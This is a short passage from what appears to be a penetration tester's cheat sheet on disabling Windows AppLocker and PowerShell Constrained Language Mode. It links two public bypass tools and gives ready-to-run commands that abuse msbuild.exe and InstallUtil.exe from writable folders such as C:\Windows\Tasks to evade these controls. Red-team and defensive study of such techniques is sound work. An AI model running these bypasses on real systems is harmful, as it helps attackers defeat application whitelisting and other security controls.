### **Disable AppLocker & CLM**

There are many different solutions so I will just make a list of possible tools that have worked for me:

- [FullBypass](https://github.com/Sh3lldon/FullBypass)

```bash
# In case AppLocker is enabled, execute it from C:\Windows\Tasks or C:\Windows\Temp
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj

```

- [bypass-clm](https://github.com/calebstewart/bypass-clm)

```powershell
# Compile and transfer it first
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"

```
